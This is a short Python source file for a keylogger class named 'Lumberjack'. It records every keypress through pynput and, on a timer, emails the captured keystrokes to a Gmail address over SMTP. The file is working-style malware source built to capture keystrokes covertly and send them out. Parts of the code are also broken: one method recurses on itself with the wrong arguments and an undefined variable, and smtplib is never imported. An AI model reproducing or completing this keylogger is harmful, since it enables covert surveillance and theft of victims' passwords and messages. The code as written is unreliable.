import pynput
import pynput.keyboard as pyk
import threading



class Lumberjack:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger Started"
        self.time_interval = time_interval
        self.email = email
        self.password = password

    def add_log(self):
        self.log = self.log + str(key.char)
        self.add_log(str(key.char))

    def process_key(self,key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key =  " " + str(key) + " "
        self.add_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start_logging(self):
        keyboard_listener = pyk.Listener(on_press=self.process_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
